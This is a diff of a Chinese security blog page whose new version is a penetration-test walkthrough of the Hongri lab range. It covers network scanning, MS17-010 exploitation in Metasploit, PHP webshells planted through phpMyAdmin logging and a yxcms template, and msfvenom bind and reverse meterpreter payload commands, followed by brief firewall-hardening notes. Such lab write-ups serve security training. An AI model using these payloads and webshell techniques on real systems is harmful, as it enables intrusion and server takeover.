@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="keywords" content="红日靶场web服务器渗透">
     
     <meta name="author" content="lee">
     
@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://leei.site/2025/10/28/实战笔记：从msf载荷生成到windows防火墙绕过/"/>
+    <link rel="canonical" href="https://leei.site/2025/10/31/红日靶场web服务器渗透/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -133,15 +133,15 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="实战笔记：从MSF载荷生成到Windows防火墙绕过">
-<meta property="og:url" content="https://leei.site/2025/10/28/%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BB%8EMSF%E8%BD%BD%E8%8D%B7%E7%94%9F%E6%88%90%E5%88%B0Windows%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:title" content="红日靶场web服务器渗透">
+<meta property="og:url" content="https://leei.site/2025/10/31/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BAweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="Lee&#39;s SecLab">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://leei.site/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-10-28T01:31:57.000Z">
-<meta property="article:modified_time" content="2025-10-29T00:43:55.493Z">
-<meta property="article:author" content="lee">
+<meta property="article:published_time" content="2025-10-30T23:03:50.550Z">
+<meta property="article:modified_time" content="2025-10-31T07:16:05.894Z">
+<meta property="article:author" content="Le_ee 博客等级 码龄1年">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://leei.site/images/redefine-og.webp">
     
@@ -155,7 +155,7 @@
     
     <title>
         
-            实战笔记：从MSF载荷生成到Windows防火墙绕过 | lee&#39;s seclab
+            红日靶场web服务器渗透 | lee&#39;s seclab
         
     </title>
 
@@ -608,7 +608,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">实战笔记：从MSF载荷生成到Windows防火墙绕过</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">红日靶场web服务器渗透</h1>
 			</div>
 			
 		</div>
@@ -620,7 +620,7 @@
 			</div>
 			<div class="info flex flex-col justify-between">
 				<div class="author flex items-center">
-					<span class="name text-default-text-color text-lg font-semibold">lee</span>
+					<span class="name text-default-text-color text-lg font-semibold">Le_ee 博客等级 码龄1年</span>
 					
 					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
 					
@@ -629,15 +629,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-10-28 09:31:57</span>
-        <span class="mobile">2025-10-28 09:31:57</span>
+        <span class="desktop">2025-10-31 07:03:50</span>
+        <span class="mobile">2025-10-31 07:03:50</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-10-29 08:43:55</span>
-            <span class="mobile">2025-10-29 08:43:55</span>
+            <span class="desktop">2025-10-31 15:16:05</span>
+            <span class="mobile">2025-10-31 15:16:05</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -666,98 +666,317 @@
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
 			<meta name="referrer" content="no-referrer"/>
 
-<h3 id="正向shell与反向shell的本质区别："><a href="#正向shell与反向shell的本质区别：" class="headerlink" title="正向shell与反向shell的本质区别："></a>正向shell与反向shell的本质区别：</h3><p>bind_tcp是靶机主动连接攻击机的ip与端口，建立shell连接</p>
-<p>reverse_tcp则是靶机等待攻击者连接（但第一步是靶机主动发起连接，然后等待)</p>
-<p>其中前者易受防火墙的影响</p>
-<p>ps：shell就像一个攻击机遥控受害机的遥控器</p>
-<p>这里我们的攻击机是kali——192.168.145.128，目标机是win7——192.168.145.160</p>
-<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>工具作用</p>
-<p>Msfvenom：生成恶意程序</p>
-<p>Exploit模块：利用漏洞执行</p>
-<p>Multi&#x2F;Handler：接收连接</p>
-<p>数据库模块：扫描结果</p>
-<h3 id="正向连接演示："><a href="#正向连接演示：" class="headerlink" title="正向连接演示："></a>正向连接演示：</h3><p>kali：msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;5555 -f exe -o b_op.exe</p>
+<p><strong>一：有关信息收集，漏洞发现，漏洞利用的攻击链</strong></p>
+<p>工具——nmap，arp-scan</p>
+<p>使用范围差异</p>
+<p>场景建议</p>
+<p>nmap（全&#x2F;深入）</p>
+<p>可以跨网段扫描</p>
+<p>扫描开放端口，跨网段</p>
+<p>arp-scan（快&#x2F;隐蔽）</p>
+<p>探测同一网段内</p>
+<p>快速发现局域网设备，绕防火墙</p>
+<p>综：可以先用arp-scan快速定位目标，找存活主机，再用nmap深度扫描端口服务</p>
+<p>先用arp-scan扫，更快，也可用 nmap -sn ….</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/07b652300c11472cae9acc5b97db2f29.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/fa3984df2b0f494a8315e243e20c4c40.png"
                      
                 ></p>
-<p>所以：b_op.exe运行后，目标机（win7）的5555端口开启监听</p>
+<p>再用Nmap 粗略扫一下该ip的端口开放情况：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/e9a8201b55174b2c801ff02bbc3e585e.png"
+                     
+                ></p>
+<p>基本确定，用Nmap 半开扫描，侵略扫描（此时kali开了root权限，-A直接包含-sT，-sV，-O）</p>
+<p>-p-全端口扫描</p>
+<p>-oN输出结果到hongri.txt</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/91bdbaefe6e34e219082136bd99fbd70.png"
+                     
+                ></p>
+<p>分析结果：版本：win7 profrssional sp1（存在大量公开漏洞），操作系统：微软windows，主机名STU1,域名：GOD.ORG</p>
+<p>关键开放端口：445&#x2F;tcp——SMB服务，可利用ms17-010，极高危漏洞</p>
+<p>1026-1028&#x2F;tcp——RPC动态端口，可以服务枚举攻击，中危漏洞</p>
+<p>并且smb签名禁用了，说明允许中间人攻击</p>
+<p>针对漏洞扫一下，检查有没有已知的高危漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/c349045af244456baeb1b5cda64b02e1.png"
+                     
+                ></p>
+<p>发现永恒之蓝存在，为高风险等级，优先攻击它以拿到system权限，然后提取哈希凭证，再进行内网横向移动</p>
+<p>并且我们得知了域名，后续可以尝试渗透整个GOD域</p>
+<p><strong>二：ms17-010永恒之蓝漏洞</strong></p>
+<p>Root权限下进入msfconsole</p>
+<p>搜索ms17-010(永恒之蓝)漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/e10185ffe37d49808513e9ef028b55a3.png"
+                     
+                ></p>
+<p>使用第一个</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/ac20315d336441f2b481f6c23c1f8f1e.png"
+                     
+                ></p>
+<p>msfvenom制作exe病毒来获取反弹shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/be14492c314c4bbea240be49452dc891.png"
+                     
+                ></p>
+<p>配置有效载荷的参数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/757501d711054c9d9251f47a6dfea397.png"
+                     
+                ></p>
+<p>运行：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/35945bed43644e7c869effb6d7bf52aa.png"
+                     
+                ></p>
+<p><strong>成功获取对方win7 web 服务器的管理员shell</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/85c6c34de1b94ce29522631eb51b0255.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/e2686b9f92f949afbf4d465c3b0712a5.png"
+                     
+                ></p>
+<p><strong>三：数据库webshell写入一句话木马</strong></p>
+<p>用kali进入win7的phpMyadmin</p>
+<p>弱密码（root&#x2F;root）登录后以root用户在对方web服务器的phpMyAdmin 中查看全局日志所在位置</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/b7f7dcb529f448b3b831c19cd1f4b4f1.png"
+                     
+                >执行该语句后发现路径为C:&#x2F;phpStudy &#x2F;MySQL&#x2F;data&#x2F;stu1.log</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/2b48d51297004f948caf32bfadbdf20d.png"
+                     
+                ></p>
+<p>将全局日志打开：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/85814072d5894b61acb085c941bee6bc.png"
+                     
+                ></p>
+<p>更改全局日志的名字为hr.php，并将其放在网站的根目录下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/233e2c6102d94a8a8be2bbfaaf2b5769.png"
+                     
+                >随后写入一句话木马，由于该语句在运行时会报错，会被写入日志中，而日志又为php文件，所以我们通过AntSword来连接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/7deff985c38444dc9248294a8c9618f3.png"
+                     
+                ></p>
+<p>蚁剑连接：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/0a995202ecdc4a1b9c29c99898d42641.png"
+                     
+                > <strong>成功GET WEBSHELL</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/c7679cc241164d6ab19734b280df4abc.png"
+                     
+                ></p>
+<ul>
+<li>*<em>后台弱口令爆破 + 模板注入GETSHELL()</em></li>
+</ul>
+<p>对后台登录页面用bp进行弱口令爆破，发现管理员用户： admin &amp; 123456，直接登录后台</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/6916e9f4a1474a628e6407351b301ba5.png"
+                     
+                ></p>
+<p>通过点击查看，可以发现到</p>
+<p>URL:<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.173/yxcms/index.php?r=admin/index/index#"  title="http://192.168.145.173:80/yxcms/index.php?r=admin/index/index#">http://192.168.145.173:80/yxcms/index.php?r=admin/index/index#<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 可以进行 写入php文件</p>
+<p>新建一个shell.php文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/82224f0952cc4b3e8cea941f7dd7bdf9.png"
+                     
+                ></p>
+<p>写入一句话木马：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/76b363fda5a24d5f8dcef733acc4bc66.png"
+                     
+                ></p>
+<p>通过查看yxcms的帮助手册得知，”模板”的文件路径为：</p>
+<p>&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;shell.php</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/2fb620d0c563448ea49e8ded8de939ae.png"
+                     
+                ></p>
+<p>AntSword成功连接木马：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/10b6659f69c94b819e34ef9cce2bf029.png"
+                     
+                ></p>
+<p><strong>Get Web Shell！:</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/9b01eb603ba14d509c1ac7195e0e73d2.png"
+                     
+                ></p>
+<p><strong>补充：MSF载荷及防火墙绕过</strong></p>
+<p><strong>shell是</strong> <strong>一个攻击机遥控受害机的遥控器</strong></p>
+<p><strong>载荷（payload）是漏洞利用成功后在受害系统上运行的代码</strong></p>
+<p>1.正向shell与反向shell区别：</p>
+<p>bind_tcp：是靶机主动连接攻击机的ip与端口，建立shell连接，易受防火墙的影响（LPORT）</p>
+<p>reverse_tcp：则第一步是靶机主动发起连接（LHOST，LPORT）</p>
+<p>什么场景下更适合使用反向 shel1? 什么场景下更适合使用正向 shel1?</p>
+<p>・如果是初次渗透：能出内网​默认用反向，因为防火墙对出栈检测比较弱，内网隔离环境用正向</p>
+<p>・如果有持久化的后门，优先用反向，因为攻击机ip的变化不不影响，并且能绕过出栈防火墙</p>
+<p>这里我们的攻击机是 <strong>kali：192.168.145.128，目标机是win7：192.168.145.160</strong></p>
+<p>区分： <strong>正向里LPORT是目标机win7端口，反向则是攻击机kali端口</strong></p>
+<p>2.有关msf</p>
+<p><strong>Msf</strong> <strong>venom</strong></p>
+<p><strong>生成恶意程序</strong></p>
+<p><strong>Exploit模块</strong></p>
+<p><strong>利用漏洞</strong> <strong>执行</strong></p>
+<p><strong>Multi&#x2F;Handler</strong></p>
+<p><strong>接收连接</strong></p>
+<p><strong>数据库模块</strong></p>
+<p><strong>扫描结果</strong></p>
+<p><strong>正向链接演示：</strong></p>
+<p>msfvenom -p windows &#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp L PORT&#x3D;5555 -f exe -o b_op.exe</p>
+<p>恶意程序&#x2F;payload&#x2F;目标操作系统&#x2F;系统架构&#x2F;载荷类型—高级交互shell&#x2F;连接方式&#x2F;地址&#x2F;文件格式</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/7b15c6207bf04136af700314510c887a.png"
+                     
+                ></p>
+<p>所以：b_op.exe运行后，目标机（win7 ）的5555端口开启监听</p>
 <p>复制到win7去</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a3abb186f9174ece9145a44c9e6d2c79.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/9f4c61c9c5244f19b3642bbf0da498ab.png"
                      
-                >msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp<br>set RHOST 192.168.145.160<br>set LPORT 5555</p>
+                ></p>
+<p>Ps：root mv</p>
+<p><strong>msfconsole</strong><br>use exploit&#x2F;multi&#x2F;handler ：通用载荷处理器<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp ：正向shell<br>set RHOST 192.168.145.160<br>set LPORT 5555</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f191a22dd3574b8fbc4b7bbe7641183c.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/19f496be61614bacb361610656ae8bad.png"
                      
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/b1637a6429474d7e9786c6bbe7eb8378.png"
-                     
-                >run！win7打开恶意文件之后回显成功</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/1a6ae98a51d14db78ca9251ffbe1bf9d.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/efa47ee6445648d2a763f48459f52b3d.png"
                      
                 ></p>
-<h3 id="反向连接演示"><a href="#反向连接演示" class="headerlink" title="反向连接演示"></a>反向连接演示</h3><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.145.128 LPORT&#x3D;9999 -f exe -o r_op.exe</p>
+<p><strong>run！win7打开恶意文件之后回显成功</strong></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e123e7c0a9bf433f96dc4ca376e6ed56.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/0d98e09e7e4d47d5bdddc2b2a99f221f.png"
                      
                 ></p>
+<h4 id="反向连接演示-："><a href="#反向连接演示-：" class="headerlink" title="反向连接演示 ："></a><strong>反向连接演示</strong> <strong>：</strong></h4><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.145.128 LPORT&#x3D;9999 -f exe -o r_op.exe</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7f61577bc5be4f28bae220d885eade04.png"
-                     
-                ></p>
-<p>其余类比bindshell</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/220074431f2a43d99e44949d784016df.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/4f8b335d5ed64a70b89671e593cfe6c2.png"
                      
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7c23cb986fa94689be8579a9b7e1d9f9.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/d8d9b5f1de934a82b41e1256a23a306b.png"
+                     
+                ></p>
+<p>其余类比bind _shell ，注意LPORT指的是kali的端口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/8d5372f92cef43bba18bf8a4bdd2bbf9.png"
+                     
+                ></p>
+<p>配置参数：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/c7774cbf9d08490788c4c6d655d4ffbd.png"
+                     
+                ></p>
+<p>运行后 <strong>成功得到目标主机的shell</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/3f8fb62021bf4a1a83ab4dee6021b370.png"
+                     
+                ></p>
+<p>补充一个PTY（伪终端模块）升级命令：</p>
+<p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>升级之后ctrlc功能正常，可以快捷键补全，响应快<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/8db03bf9c07e4deb83ace469bc37e7c9.png"
+                     
+                ></p>
+<h4 id="防火墙加固"><a href="#防火墙加固" class="headerlink" title="防火墙加固"></a><strong>防火墙加固</strong></h4><p>win7</p>
+<p>进入任务管理器把刚才的b_op.exe和r_op.exe结束进程，然后建立新的出站规则</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/d3c044b383514c41852fec1cdeaf0d07.png"
                      
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/0fa919c559e746ffaa46aa3467714b1d.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/52ce740efcc94538a7af221cdc8fc86e.png"
                      
                 ></p>
-<h3 id="防火墙加固"><a href="#防火墙加固" class="headerlink" title="防火墙加固"></a>防火墙加固</h3><p>win7</p>
-<p>进入任务管理器把刚才的b_op.exe和r_op.exe结束进程</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ad4084410ce243629df2643df2ba5dcd.png"
-                     
-                >不再有端口被监听</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/70e8c0500b8846f6bf79dd8fc7a141d9.png"
-                     
-                ></p>
-<h3 id="在真实的渗透测试中，什么场景下更适合使用反向-shel1-什么场景下更适合使用正向-shel1"><a href="#在真实的渗透测试中，什么场景下更适合使用反向-shel1-什么场景下更适合使用正向-shel1" class="headerlink" title="在真实的渗透测试中，什么场景下更适合使用反向 shel1?什么场景下更适合使用正向 shel1?"></a>在真实的渗透测试中，什么场景下更适合使用反向 shel1?什么场景下更适合使用正向 shel1?</h3><p>·如果是初次渗透：​能出内网​默认用反向，因为防火墙对出栈检测比较弱，内网隔离环境用正向<br>·如果有持久化的后门，优先用反向</p>
-<h3 id="仅通过配置出站规则，能否有效防御所有反向连接-为什么"><a href="#仅通过配置出站规则，能否有效防御所有反向连接-为什么" class="headerlink" title="仅通过配置出站规则，能否有效防御所有反向连接?为什么?"></a>仅通过配置出站规则，能否有效防御所有反向连接?为什么?</h3><p>·不能，攻击者可能采用端口欺骗（比如用80，443端口等），协议伪装（比如看起来像DNS域名查询或浏览网页）</p>
-<h3 id="除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击"><a href="#除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击" class="headerlink" title="除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击?"></a>除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击?</h3><p>·使用白名单——只允许特定程序访问，其他一律组织</p>
+<p>仅通过配置出站规则，能否有效防御所有反向连接？</p>
+<p>・不能，攻击者可能采用端口欺骗（比如用 80，443 端口等），协议伪装（比如看起来像 DNS 域名查询或浏览网页）</p>
+<p>除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击？</p>
+<p>・使用白名单 —— 只允许特定程序访问，其他一律阻止</p>
 
 		</div>
 
@@ -765,18 +984,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> 实战笔记：从MSF载荷生成到Windows防火墙绕过</li>
-        <li><strong>Author:</strong> lee</li>
+        <li><strong>Title:</strong> 红日靶场web服务器渗透</li>
+        <li><strong>Author:</strong> Le_ee 博客等级 码龄1年</li>
         <li><strong>Created at
-                :</strong> 2025-10-28 09:31:57</li>
+                :</strong> 2025-10-31 07:03:50</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-10-29 08:43:55
+                    :</strong> 2025-10-31 15:16:05
             </li>
         
         <li>
-            <strong>Link:</strong> https://leei.site/2025/10/28/实战笔记：从MSF载荷生成到Windows防火墙绕过/
+            <strong>Link:</strong> https://leei.site/2025/10/31/红日靶场web服务器渗透/
         </li>
         <li>
             <strong>
@@ -801,18 +1020,18 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/10/29/REI%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/10/29/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">REI——远程文件包含</span>
-						<span class="post-nav-item">Prev posts</span>
+						<span class="post-nav-title-item truncate max-w-48">端口转发实操</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
 					</span>
 				</a>
 			</div>
-			
 			
 		</div>
 		
@@ -867,8 +1086,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">实战笔记：从MSF载荷生成到Windows防火墙绕过</div>
-		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%90%91shell%E4%B8%8E%E5%8F%8D%E5%90%91shell%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="nav-text">正向shell与反向shell的本质区别：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf"><span class="nav-text">msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E6%BC%94%E7%A4%BA%EF%BC%9A"><span class="nav-text">正向连接演示：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E6%BC%94%E7%A4%BA"><span class="nav-text">反向连接演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E5%8A%A0%E5%9B%BA"><span class="nav-text">防火墙加固</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%9C%9F%E5%AE%9E%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%EF%BC%8C%E4%BB%80%E4%B9%88%E5%9C%BA%E6%99%AF%E4%B8%8B%E6%9B%B4%E9%80%82%E5%90%88%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91-shel1-%E4%BB%80%E4%B9%88%E5%9C%BA%E6%99%AF%E4%B8%8B%E6%9B%B4%E9%80%82%E5%90%88%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%90%91-shel1"><span class="nav-text">在真实的渗透测试中，什么场景下更适合使用反向 shel1?什么场景下更适合使用正向 shel1?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%85%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE%E5%87%BA%E7%AB%99%E8%A7%84%E5%88%99%EF%BC%8C%E8%83%BD%E5%90%A6%E6%9C%89%E6%95%88%E9%98%B2%E5%BE%A1%E6%89%80%E6%9C%89%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E4%B8%BA%E4%BB%80%E4%B9%88"><span class="nav-text">仅通过配置出站规则，能否有效防御所有反向连接?为什么?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%A4%E4%BA%86%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%EF%BC%8C%E8%BF%98%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9B%B4%E9%AB%98%E7%BA%A7%E7%9A%84%E5%8A%A0%E5%9B%BA%E6%89%8B%E6%AE%B5%E5%8F%AF%E4%BB%A5%E9%98%B2%E5%BE%A1%E6%AD%A4%E7%B1%BB%E6%94%BB%E5%87%BB"><span class="nav-text">除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击?</span></a></li></ol>
+		<div class="page-title">红日靶场web服务器渗透</div>
+		
 
 	</div>
 </div>
